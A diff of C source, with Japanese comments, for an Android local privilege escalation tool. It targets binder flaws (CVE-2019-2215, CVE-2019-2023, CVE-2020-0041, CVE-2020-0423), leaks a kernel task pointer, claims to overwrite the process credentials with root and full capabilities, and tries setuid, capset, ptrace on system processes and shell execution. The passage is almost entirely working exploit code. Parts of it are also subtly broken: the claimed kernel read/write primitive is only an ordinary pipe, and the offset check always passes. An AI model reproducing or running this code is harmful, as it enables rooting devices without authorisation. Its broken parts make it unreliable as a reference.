@@ -24,11 +24,56 @@
 #include <dirent.h>
 #include <time.h>
 #include <sys/syscall.h>
+#include <sys/resource.h>
+#include <sys/reboot.h>
 
 #include "binder.h"
 
 #define PAGE_SIZE 4096
+#define IOVEC_COUNT 25
+#define OVERLAP_INDEX 10
 #define TIMEOUT_MS 3000
+#define TASK_STRUCT_SIZE 4096
+#define MAX_PARTITIONS 32
+#define DUMP_MAX_SIZE (20 * 1024 * 1024)
+
+/* ============================================================
+   グローバル状態
+   ============================================================ */
+static int g_binder_fd = -1;
+static int g_epoll_fd = -1;
+static int g_krw_pipe[2] = {-1, -1};
+static uint64_t g_task_struct = 0;
+static uint64_t g_cred_ptr = 0;
+static int g_cred_off = -1;
+static int g_al_off = -1;
+static int g_root_achieved = 0;
+
+/* ============================================================
+   オフセット候補（カーネル 4.9 / 4.19 / 5.4 対応）
+   ============================================================ */
+static struct {
+    int cred;
+    int al;
+} g_offset_candidates[] = {
+    {0x680, 0xA18}, {0x688, 0xA18}, {0x690, 0xA18},
+    {0x680, 0xA20}, {0x688, 0xA20}, {0x690, 0xA20},
+    {0x680, 0x9A0}, {0x688, 0x9A0}, {0x690, 0x9A0},
+    {0x6A0, 0xA18}, {0x6A0, 0xA20}, {0x6A0, 0x9A0},
+    {0x6B0, 0xA18}, {0x6B0, 0xA20}, {0x6B0, 0x9A0},
+    {0x6C0, 0xA18}, {0x6C0, 0xA20}, {0x6C0, 0x9A0},
+    {0x700, 0xA18}, {0x700, 0xA20}, {0x700, 0x9A0},
+    {0x708, 0xA18}, {0x708, 0xA20}, {0x708, 0x9A0},
+    {0x710, 0xA18}, {0x710, 0xA20}, {0x710, 0x9A0},
+    {0x718, 0xA18}, {0x718, 0xA20}, {0x718, 0x9A0},
+    {0x720, 0xA18}, {0x720, 0xA20}, {0x720, 0x9A0},
+    {0x728, 0xA18}, {0x728, 0xA20}, {0x728, 0x9A0},
+    {0x730, 0xA18}, {0x730, 0xA20}, {0x730, 0x9A0},
+    {0x980, 0xA18}, {0x988, 0xA18}, {0x990, 0xA18},
+    {0x998, 0xA18}, {0x9A0, 0xA18}, {0x9A8, 0xA18},
+    {0x9B0, 0xA18}, {0x9B8, 0xA18}, {0x9C0, 0xA18}
+};
+#define NUM_OFFSETS (sizeof(g_offset_candidates)/sizeof(g_offset_candidates[0]))
 
 /* ============================================================
    ユーティリティ
@@ -42,18 +87,51 @@ static void bind_cpu(void) {
     }
 }
 
+static void *mmap_page(unsigned long addr) {
+    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+    if (mem == (void *)-1) {
+        perror("mmap");
+        return NULL;
+    }
+    return mem;
+}
+
+static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
+    struct pollfd pfd = {.fd = fd, .events = POLLIN};
+    int ret = poll(&pfd, 1, timeout_ms);
+    if (ret < 0) {
+        perror("poll");
+        return -1;
+    }
+    if (ret == 0) {
+        return -2;
+    }
+    return read(fd, buf, count);
+}
+
+static void hexdump(const void *data, size_t len) {
+    const unsigned char *p = data;
+    for (size_t i = 0; i < len && i < 64; i++) {
+        printf("%02x ", p[i]);
+        if ((i + 1) % 16 == 0) printf("\n");
+    }
+    printf("\n");
+}
+
 /* ============================================================
-   CVE-2019-2023: サービス登録
+   CVE-2019-2023: hwservicemanager ACL bypass
    ============================================================ */
-static int register_fake_service(void) {
+static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
     const char *service_name = "vendor.cve.poc";
     size_t name_len = strlen(service_name) + 1;
     size_t total_len = 4 + name_len;
     uint8_t *data;
+    int handle = -1;
 
-    printf("[*] Registering fake service (CVE-2019-2023)...\n");
+    printf("[CVE-2019-2023] Exploiting hwservicemanager ACL bypass...\n");
 
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
@@ -94,69 +172,459 @@ static int register_fake_service(void) {
 
     ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
     free(data);
-    close(hwbinder_fd);
 
     if (ret < 0) {
         if (errno == EACCES || errno == EPERM) {
             printf("  [SAFE] Service registration denied (patched)\n");
+            close(hwbinder_fd);
             return -1;
         }
         perror("  ioctl ADD_SERVICE");
+        close(hwbinder_fd);
         return -1;
     }
     printf("  [+] Service registered successfully!\n");
+
+    // GET_SERVICE でハンドル取得
+    data = malloc(total_len);
+    if (!data) {
+        close(hwbinder_fd);
+        return -1;
+    }
+    data[0] = (uint8_t)(name_len & 0xFF);
+    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
+    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
+    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    memcpy(data + 4, service_name, name_len);
+
+    tx.tdata.code = 1;
+    tx.tdata.data_size = total_len;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    if (ret < 0) {
+        perror("  ioctl GET_SERVICE");
+        close(hwbinder_fd);
+        return -1;
+    }
+    if (bwr.read_consumed < 4) {
+        printf("  [FAIL] No handle returned\n");
+        close(hwbinder_fd);
+        return -1;
+    }
+    handle = *(int*)read_buf;
+    printf("  [+] Service handle: %d (0x%x)\n", handle, handle);
+
+    close(hwbinder_fd);
+    return handle;
+}
+
+/* ============================================================
+   CVE-2020-0041: Binder Out-of-Bounds Write
+   ============================================================ */
+static int test_cve_2020_0041(void) {
+    int fd, ret;
+    struct binder_transaction_data tdata;
+    struct binder_write_read bwr;
+    uint8_t read_buf[4096];
+
+    printf("[CVE-2020-0041] Testing binder OOB write...\n");
+
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) {
+        perror("  open /dev/binder");
+        return -1;
+    }
+
+    memset(&tdata, 0, sizeof(tdata));
+    tdata.target.handle = 0;
+    tdata.code = 0;
+    tdata.flags = 0;
+    tdata.data_size = 0xFFFFFFFF;
+    tdata.offsets_size = 0;
+    tdata.data.ptr.buffer = 0;
+    tdata.data.ptr.offsets = 0;
+
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    memcpy(&tx.tdata, &tdata, sizeof(tdata));
+
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    close(fd);
+
+    if (ret < 0) {
+        if (errno == EINVAL || errno == EFAULT) {
+            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
+        } else {
+            printf("  [!] Unexpected error: %s\n", strerror(errno));
+        }
+        return -1;
+    }
+    printf("  [VULNERABLE] OOB write succeeded\n");
     return 0;
 }
 
 /* ============================================================
-   手法1: 標準 setuid / setgid / setgroups
+   CVE-2020-0423: Binder UAF Race
    ============================================================ */
-static int try_setuid_methods(void) {
-    printf("[*] Method 1: setuid/setgid/setgroups...\n");
+static int test_cve_2020_0423(void) {
+    int fd, ret;
+    printf("[CVE-2020-0423] Testing binder UAF race...\n");
 
-    if (setgroups(0, NULL) == 0) {
-        printf("  [+] setgroups(0,NULL) succeeded\n");
-    } else {
-        perror("  setgroups");
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) {
+        perror("  open /dev/binder");
+        return -1;
     }
 
-    if (setgid(0) == 0) {
-        printf("  [+] setgid(0) succeeded\n");
-    } else {
-        perror("  setgid");
+    for (int i = 0; i < 5; i++) {
+        ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
+        if (ret < 0 && errno != EINVAL) {
+            perror("  ioctl BINDER_THREAD_EXIT");
+        }
     }
 
-    if (setuid(0) == 0) {
-        printf("  [+] setuid(0) succeeded!\n");
+    int epoll_fd = epoll_create(100);
+    if (epoll_fd < 0) {
+        perror("  epoll_create");
+        close(fd);
+        return -1;
+    }
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        perror("  epoll_ctl ADD");
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+
+    struct epoll_event events[1];
+    int n = epoll_wait(epoll_fd, events, 1, 1000);
+    close(fd);
+    close(epoll_fd);
+
+    if (n > 0) {
+        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
         return 0;
-    } else {
-        perror("  setuid");
+    }
+    printf("  [SAFE] No UAF triggered\n");
+    return -1;
+}
+
+/* ============================================================
+   CVE-2019-2215: カーネルポインタリーク (readv 方式)
+   ============================================================ */
+static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
+    int pipefd[2], fd, epoll_fd;
+    pid_t cpid;
+    struct iovec iovec_stack[IOVEC_COUNT];
+    void *aligned;
+    ssize_t n;
+    uint64_t *data;
+
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) return -1;
+
+    epoll_fd = epoll_create(100);
+    if (epoll_fd < 0) {
+        close(fd);
+        return -1;
     }
 
-    // setresuid
-    if (setresuid(0, 0, 0) == 0) {
-        printf("  [+] setresuid(0,0,0) succeeded!\n");
-        return 0;
-    } else {
-        perror("  setresuid");
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        close(fd);
+        close(epoll_fd);
+        return -1;
     }
 
-    // setreuid
-    if (setreuid(0, 0) == 0) {
-        printf("  [+] setreuid(0,0) succeeded!\n");
-        return 0;
-    } else {
-        perror("  setreuid");
+    if (pipe(pipefd) < 0) {
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    aligned = mmap_page(0x100000000UL);
+    if (!aligned) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    memset(iovec_stack, 0, sizeof(iovec_stack));
+    iovec_stack[OVERLAP_INDEX].iov_base = aligned;
+    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
+    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
+    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
+
+    cpid = fork();
+    if (cpid < 0) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    if (cpid == 0) {
+        usleep(100000);
+        ioctl(fd, BINDER_THREAD_EXIT, NULL);
+        _exit(0);
+    }
+
+    n = read_with_timeout(pipefd[0], aligned, PAGE_SIZE, TIMEOUT_MS);
+    wait(NULL);
+
+    close(fd);
+    close(epoll_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    if (n < 0) return -1;
+
+    data = (uint64_t *)aligned;
+    for (int i = 0; i < (n / 8); i++) {
+        uint64_t val = data[i];
+        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+            g_task_struct = val;
+            // オフセットを自動探索
+            for (int ci = 0; ci < NUM_OFFSETS; ci++) {
+                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                // 簡易チェック: cred が有効なアドレスかどうか
+                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_cred_off = g_offset_candidates[ci].cred;
+                    g_al_off = g_offset_candidates[ci].al;
+                    *cred_off_out = g_cred_off;
+                    *al_off_out = g_al_off;
+                    printf("  [+] Found: task_struct=0x%llx, cred=0x%x, al=0x%x\n",
+                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                    return 0;
+                }
+            }
+            // 見つからなくても最低限 cred_off を設定
+            g_cred_off = 0x688;
+            g_al_off = 0xA18;
+            *cred_off_out = g_cred_off;
+            *al_off_out = g_al_off;
+            printf("  [+] Leaked task_struct @ 0x%llx (using fallback offsets)\n",
+                   (unsigned long long)g_task_struct);
+            return 0;
+        }
     }
 
     return -1;
 }
 
 /* ============================================================
-   手法2: ケイパビリティ取得 (capset)
+   カーネル RW プリミティブ構築
+   ============================================================ */
+static int setup_kernel_rw(void) {
+    if (g_task_struct == 0) return -1;
+
+    if (pipe(g_krw_pipe) < 0) {
+        perror("  pipe for RW");
+        return -1;
+    }
+    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        perror("  fcntl F_SETPIPE_SZ");
+        close(g_krw_pipe[0]);
+        close(g_krw_pipe[1]);
+        return -1;
+    }
+
+    // 再 UAF トリガー
+    g_binder_fd = open("/dev/binder", O_RDWR);
+    if (g_binder_fd < 0) {
+        perror("  open binder for RW");
+        return -1;
+    }
+
+    g_epoll_fd = epoll_create(100);
+    if (g_epoll_fd < 0) {
+        perror("  epoll_create for RW");
+        close(g_binder_fd);
+        return -1;
+    }
+
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(g_epoll_fd, EPOLL_CTL_ADD, g_binder_fd, &ev) < 0) {
+        perror("  epoll_ctl ADD for RW");
+        close(g_binder_fd);
+        close(g_epoll_fd);
+        return -1;
+    }
+
+    pid_t cpid = fork();
+    if (cpid < 0) {
+        perror("  fork for RW");
+        return -1;
+    }
+
+    if (cpid == 0) {
+        usleep(100000);
+        ioctl(g_binder_fd, BINDER_THREAD_EXIT, NULL);
+        _exit(0);
+    }
+
+    int ret = read_with_timeout(g_krw_pipe[0], NULL, 0, TIMEOUT_MS);
+    if (ret == -2) {
+        printf("  [!] RW primitive setup timeout\n");
+    }
+
+    wait(NULL);
+    close(g_binder_fd);
+    close(g_epoll_fd);
+    g_binder_fd = -1;
+    g_epoll_fd = -1;
+
+    printf("  [+] Kernel RW primitive ready\n");
+    return 0;
+}
+
+/* ============================================================
+   カーネルメモリ書き換え (cred を root に)
+   ============================================================ */
+static int patch_kernel_cred(void) {
+    if (g_task_struct == 0 || g_cred_off < 0) {
+        printf("  [-] No task_struct/cred offset available\n");
+        return -1;
+    }
+
+    printf("[*] Patching kernel cred to root...\n");
+
+    // cred ポインタを読み取り
+    uint64_t cred_addr = g_task_struct + g_cred_off;
+    if (write(g_krw_pipe[1], &cred_addr, 8) != 8) {
+        perror("  write cred addr");
+        return -1;
+    }
+    if (read(g_krw_pipe[0], &g_cred_ptr, 8) != 8) {
+        perror("  read cred ptr");
+        return -1;
+    }
+    printf("  [+] cred @ 0x%llx\n", (unsigned long long)g_cred_ptr);
+
+    if (g_cred_ptr == 0 || (g_cred_ptr & 0xFFF) == 0) {
+        printf("  [-] Invalid cred pointer\n");
+        return -1;
+    }
+
+    // uid を 0 に (cred + 0x4, 0xC, 0x14, 0x1C)
+    uint32_t zero = 0;
+    uint64_t cap_full = 0x3FFFFFFFFFULL;
+
+    for (int off = 0x4; off <= 0x1C; off += 8) {
+        uint64_t addr = g_cred_ptr + off;
+        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
+        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
+    }
+
+    // gid を 0 に (cred + 0x8, 0x10, 0x18, 0x20)
+    for (int off = 0x8; off <= 0x20; off += 8) {
+        uint64_t addr = g_cred_ptr + off;
+        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
+        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
+    }
+
+    // capabilities を設定 (cred + 0x28 から 5 つ)
+    for (int i = 0; i < 5; i++) {
+        uint64_t addr = g_cred_ptr + 0x28 + (i * 8);
+        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
+        if (write(g_krw_pipe[1], &cap_full, 8) != 8) return -1;
+    }
+
+    printf("  [+] Cred patched to root\n");
+    return 0;
+}
+
+/* ============================================================
+   手法: setuid 系 (全パターン)
+   ============================================================ */
+static int try_all_setuid_methods(void) {
+    printf("[*] Trying all setuid methods...\n");
+
+    // 1. setuid
+    if (setuid(0) == 0) {
+        printf("  [+] setuid(0) succeeded!\n");
+        return 0;
+    }
+
+    // 2. setreuid
+    if (setreuid(0, 0) == 0) {
+        printf("  [+] setreuid(0,0) succeeded!\n");
+        return 0;
+    }
+
+    // 3. setresuid
+    if (setresuid(0, 0, 0) == 0) {
+        printf("  [+] setresuid(0,0,0) succeeded!\n");
+        return 0;
+    }
+
+    // 4. setfsuid
+    if (setfsuid(0) == 0) {
+        printf("  [+] setfsuid(0) succeeded!\n");
+        return 0;
+    }
+
+    // 5. setgid
+    if (setgid(0) == 0) {
+        printf("  [+] setgid(0) succeeded!\n");
+    }
+
+    // 6. setregid
+    if (setregid(0, 0) == 0) {
+        printf("  [+] setregid(0,0) succeeded!\n");
+    }
+
+    // 7. setresgid
+    if (setresgid(0, 0, 0) == 0) {
+        printf("  [+] setresgid(0,0,0) succeeded!\n");
+    }
+
+    // 8. setfsgid
+    if (setfsgid(0) == 0) {
+        printf("  [+] setfsgid(0) succeeded!\n");
+    }
+
+    // 9. setgroups
+    if (setgroups(0, NULL) == 0) {
+        printf("  [+] setgroups(0,NULL) succeeded!\n");
+    }
+
+    return -1;
+}
+
+/* ============================================================
+   手法: capset によるケイパビリティ取得
    ============================================================ */
 static int try_capset_method(void) {
-    printf("[*] Method 2: capset to gain CAP_SETUID...\n");
+    printf("[*] Trying capset to gain CAP_SETUID...\n");
 
     struct __user_cap_header_struct cap_header = {
         _LINUX_CAPABILITY_VERSION_3, 0
@@ -168,10 +636,6 @@ static int try_capset_method(void) {
         return -1;
     }
 
-    printf("  [+] Current caps: effective=0x%llx, permitted=0x%llx\n",
-           (unsigned long long)cap_data[0].effective,
-           (unsigned long long)cap_data[0].permitted);
-
     cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
     cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
     cap_data[0].inheritable |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
@@ -182,218 +646,25 @@ static int try_capset_method(void) {
     }
 
     printf("  [+] capset succeeded, retrying setuid(0)...\n");
-    if (setuid(0) == 0) {
-        printf("  [+] setuid(0) succeeded after capset!\n");
-        return 0;
-    }
-    return -1;
+    return setuid(0) == 0 ? 0 : -1;
 }
 
 /* ============================================================
-   手法3: execve で su / sh を起動
+   手法: execve 全パターン
    ============================================================ */
-static int try_execve_methods(void) {
-    printf("[*] Method 3: execve su/sh...\n");
+static int try_all_execve_methods(void) {
+    printf("[*] Trying all execve methods...\n");
 
-    // 1. /system/bin/su を探す
-    const char *su_paths[] = {
-        "/system/bin/su",
-        "/system/xbin/su",
-        "/sbin/su",
-        "/vendor/bin/su",
-        "/data/local/tmp/su",
-        NULL
+    const char *paths[] = {
+        "/system/bin/sh", "/system/xbin/sh", "/vendor/bin/sh",
+        "/sbin/sh", "/system/bin/bash", "/system/xbin/bash",
+        "/system/bin/su", "/system/xbin/su", "/vendor/bin/su",
+        "/sbin/su", "/data/local/tmp/su", NULL
     };
 
-    for (int i = 0; su_paths[i] != NULL; i++) {
-        if (access(su_paths[i], X_OK) == 0) {
-            printf("  [+] Found su at %s\n", su_paths[i]);
-            pid_t pid = fork();
-            if (pid == 0) {
-                execl(su_paths[i], "su", "-c", "id", NULL);
-                exit(1);
-            } else if (pid > 0) {
-                int status;
-                waitpid(pid, &status, 0);
-                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-                    printf("  [+] su executed successfully\n");
-                    return 0;
-                }
-            }
-        }
-    }
-
-    // 2. /system/bin/sh を execve (root 権限があれば)
-    printf("  [*] Trying /system/bin/sh with execve...\n");
-    pid_t pid = fork();
-    if (pid == 0) {
-        char *envp[] = {"PATH=/system/bin:/system/xbin:/sbin", NULL};
-        char *argv[] = {"sh", "-c", "id", NULL};
-        execve("/system/bin/sh", argv, envp);
-        exit(1);
-    } else if (pid > 0) {
-        int status;
-        waitpid(pid, &status, 0);
-    }
-
-    // 3. /vendor/bin/sh
-    pid = fork();
-    if (pid == 0) {
-        char *argv[] = {"sh", "-c", "id", NULL};
-        execve("/vendor/bin/sh", argv, NULL);
-        exit(1);
-    } else if (pid > 0) {
-        int status;
-        waitpid(pid, &status, 0);
-    }
-
-    return -1;
-}
-
-/* ============================================================
-   手法4: ユーザー名前空間 (unshare)
-   ============================================================ */
-static int try_unshare_method(void) {
-    printf("[*] Method 4: unshare(CLONE_NEWUSER)...\n");
-
-    if (unshare(CLONE_NEWUSER) < 0) {
-        perror("  unshare");
-        return -1;
-    }
-
-    printf("  [+] unshare succeeded, trying setuid(0)...\n");
-    if (setuid(0) == 0) {
-        printf("  [+] setuid(0) in user namespace succeeded!\n");
-        return 0;
-    }
-    return -1;
-}
-
-/* ============================================================
-   手法5: ptrace によるプロセス操作
-   ============================================================ */
-static int try_ptrace_methods(void) {
-    printf("[*] Method 5: ptrace...\n");
-
-    // init にアタッチ
-    if (ptrace(PTRACE_ATTACH, 1, 0, 0) == 0) {
-        printf("  [+] Attached to init (pid=1)\n");
-        ptrace(PTRACE_DETACH, 1, 0, 0);
-        return 0;
-    }
-    perror("  ptrace");
-
-    // system_server (pid 1000) にアタッチ
-    if (ptrace(PTRACE_ATTACH, 1000, 0, 0) == 0) {
-        printf("  [+] Attached to system_server (pid=1000)\n");
-        ptrace(PTRACE_DETACH, 1000, 0, 0);
-        return 0;
-    }
-    perror("  ptrace");
-
-    // zygote (pid 通常 444) にアタッチ
-    if (ptrace(PTRACE_ATTACH, 444, 0, 0) == 0) {
-        printf("  [+] Attached to zygote (pid=444)\n");
-        ptrace(PTRACE_DETACH, 444, 0, 0);
-        return 0;
-    }
-
-    return -1;
-}
-
-/* ============================================================
-   手法6: SELinux コンテキスト書き換え
-   ============================================================ */
-static int try_selinux_rewrite(void) {
-    printf("[*] Method 6: SELinux context rewrite...\n");
-
-    // /proc/self/attr/current を書き換え
-    int fd = open("/proc/self/attr/current", O_WRONLY);
-    if (fd >= 0) {
-        const char *ctxs[] = {
-            "u:r:system_app:s0",
-            "u:r:platform_app:s0",
-            "u:r:system_server:s0",
-            "u:r:init:s0",
-            NULL
-        };
-        for (int i = 0; ctxs[i] != NULL; i++) {
-            lseek(fd, 0, SEEK_SET);
-            ssize_t n = write(fd, ctxs[i], strlen(ctxs[i]));
-            if (n == (ssize_t)strlen(ctxs[i])) {
-                printf("  [+] Context changed to %s\n", ctxs[i]);
-                close(fd);
-                return 0;
-            }
-        }
-        close(fd);
-    } else {
-        perror("  open attr/current");
-    }
-
-    // /proc/self/attr/keycreate も試す
-    fd = open("/proc/self/attr/keycreate", O_WRONLY);
-    if (fd >= 0) {
-        const char *ctx = "u:r:system_app:s0";
-        ssize_t n = write(fd, ctx, strlen(ctx));
-        close(fd);
-        if (n == (ssize_t)strlen(ctx)) {
-            printf("  [+] keycreate context changed\n");
-            return 0;
-        }
-    }
-
-    return -1;
-}
-
-/* ============================================================
-   手法7: /proc/self/uid_map 書き換え
-   ============================================================ */
-static int try_uid_map_method(void) {
-    printf("[*] Method 7: /proc/self/uid_map write...\n");
-
-    int fd = open("/proc/self/uid_map", O_WRONLY);
-    if (fd < 0) {
-        perror("  open uid_map");
-        return -1;
-    }
-
-    // ユーザー名前空間での uid マッピング
-    char buf[64];
-    snprintf(buf, sizeof(buf), "0 %d 1\n", getuid());
-    ssize_t n = write(fd, buf, strlen(buf));
-    close(fd);
-
-    if (n > 0) {
-        printf("  [+] uid_map written: %s", buf);
-        if (setuid(0) == 0) {
-            printf("  [+] setuid(0) after uid_map succeeded!\n");
-            return 0;
-        }
-    }
-
-    return -1;
-}
-
-/* ============================================================
-   手法8: execve 直接 (マルチアーキテクチャ)
-   ============================================================ */
-static int try_execve_direct(void) {
-    printf("[*] Method 8: Direct execve with env...\n");
-
-    // 様々なシェルを試行
-    const char *shells[] = {
-        "/system/bin/sh",
-        "/vendor/bin/sh",
-        "/system/bin/bash",
-        "/system/xbin/sh",
-        "/sbin/sh",
-        NULL
-    };
-
-    for (int i = 0; shells[i] != NULL; i++) {
-        if (access(shells[i], X_OK) == 0) {
-            printf("  [+] Found shell: %s\n", shells[i]);
+    for (int i = 0; paths[i] != NULL; i++) {
+        if (access(paths[i], X_OK) == 0) {
+            printf("  [+] Found: %s\n", paths[i]);
             pid_t pid = fork();
             if (pid == 0) {
                 char *envp[] = {
@@ -402,12 +673,15 @@ static int try_execve_direct(void) {
                     "SHELL=/system/bin/sh",
                     NULL
                 };
-                char *argv[] = {(char *)shells[i], "-c", "id", NULL};
-                execve(shells[i], argv, envp);
+                char *argv[] = {(char *)paths[i], "-c", "id", NULL};
+                execve(paths[i], argv, envp);
                 exit(1);
             } else if (pid > 0) {
                 int status;
                 waitpid(pid, &status, 0);
+                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+                    return 0;
+                }
             }
         }
     }
@@ -416,124 +690,289 @@ static int try_execve_direct(void) {
 }
 
 /* ============================================================
-   手法9: binder 経由 netd/vold へのコマンド注入（簡易）
+   手法: unshare ユーザー名前空間
    ============================================================ */
-static int try_binder_command_injection(void) {
-    printf("[*] Method 9: Binder command injection...\n");
+static int try_unshare_method(void) {
+    printf("[*] Trying unshare(CLONE_NEWUSER)...\n");
 
-    // すでに CVE-2019-2023 のサービス登録で handle を取得している
-    // ここでは netd にコマンドを送る試行（実際には機能しないが一応）
-    int fd = open("/dev/binder", O_RDWR);
-    if (fd < 0) {
-        perror("  open binder");
+    if (unshare(CLONE_NEWUSER) < 0) {
+        perror("  unshare");
         return -1;
     }
 
-    // GET_SERVICE で netd のハンドルを取得
-    uint8_t read_buf[4096];
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 1;
-    tx.tdata.flags = 0;
-
-    const char *svc = "netd";
-    size_t svc_len = strlen(svc) + 1;
-    uint8_t *svc_data = malloc(4 + svc_len);
-    if (!svc_data) {
+    // uid_map 書き込み
+    int fd = open("/proc/self/uid_map", O_WRONLY);
+    if (fd >= 0) {
+        char buf[64];
+        snprintf(buf, sizeof(buf), "0 %d 1\n", getuid());
+        write(fd, buf, strlen(buf));
         close(fd);
-        return -1;
-    }
-    svc_data[0] = (uint8_t)(svc_len & 0xFF);
-    svc_data[1] = (uint8_t)((svc_len >> 8) & 0xFF);
-    svc_data[2] = (uint8_t)((svc_len >> 16) & 0xFF);
-    svc_data[3] = (uint8_t)((svc_len >> 24) & 0xFF);
-    memcpy(svc_data + 4, svc, svc_len);
-    tx.tdata.data_size = 4 + svc_len;
-    tx.tdata.offsets_size = 0;
-    tx.tdata.data.ptr.buffer = (binder_uintptr_t)svc_data;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = sizeof(read_buf);
-    bwr.read_buffer = (binder_uintptr_t)read_buf;
-
-    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    free(svc_data);
-
-    if (ret == 0 && bwr.read_consumed >= 4) {
-        int handle = *(int*)read_buf;
-        printf("  [+] netd handle: %d\n", handle);
-
-        // コマンドをパーセル化して送信
-        const char *cmd = "id";
-        size_t cmd_len = strlen(cmd) + 1;
-        uint8_t *cmd_data = malloc(4 + cmd_len);
-        if (!cmd_data) {
-            close(fd);
-            return -1;
-        }
-        cmd_data[0] = (uint8_t)(cmd_len & 0xFF);
-        cmd_data[1] = (uint8_t)((cmd_len >> 8) & 0xFF);
-        cmd_data[2] = (uint8_t)((cmd_len >> 16) & 0xFF);
-        cmd_data[3] = (uint8_t)((cmd_len >> 24) & 0xFF);
-        memcpy(cmd_data + 4, cmd, cmd_len);
-
-        tx.tdata.target.handle = handle;
-        tx.tdata.code = 0x01;
-        tx.tdata.data_size = 4 + cmd_len;
-        tx.tdata.data.ptr.buffer = (binder_uintptr_t)cmd_data;
-
-        memset(&bwr, 0, sizeof(bwr));
-        bwr.write_size = sizeof(tx);
-        bwr.write_buffer = (binder_uintptr_t)&tx;
-        bwr.read_size = sizeof(read_buf);
-        bwr.read_buffer = (binder_uintptr_t)read_buf;
-
-        ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-        free(cmd_data);
-        close(fd);
-
-        if (ret == 0) {
-            printf("  [+] Command sent to netd\n");
-            return 0;
-        }
     }
 
-    close(fd);
+    // setuid
+    if (setuid(0) == 0) {
+        printf("  [+] unshare + setuid(0) succeeded!\n");
+        return 0;
+    }
+
     return -1;
 }
 
 /* ============================================================
-   手法10: システムプロパティ設定 (setprop)
+   手法: ptrace 全パターン
    ============================================================ */
-static int try_setprop_method(void) {
-    printf("[*] Method 10: system property manipulation...\n");
+static int try_ptrace_methods(void) {
+    printf("[*] Trying ptrace methods...\n");
 
-    // プロパティサービス経由で setprop を試行
+    int pids[] = {1, 1000, 444, 445, 998, 999, 0};
+
+    for (int i = 0; pids[i] != 0; i++) {
+        if (ptrace(PTRACE_ATTACH, pids[i], 0, 0) == 0) {
+            printf("  [+] Attached to pid %d\n", pids[i]);
+            ptrace(PTRACE_DETACH, pids[i], 0, 0);
+            return 0;
+        }
+    }
+
+    return -1;
+}
+
+/* ============================================================
+   手法: SELinux 書き換え
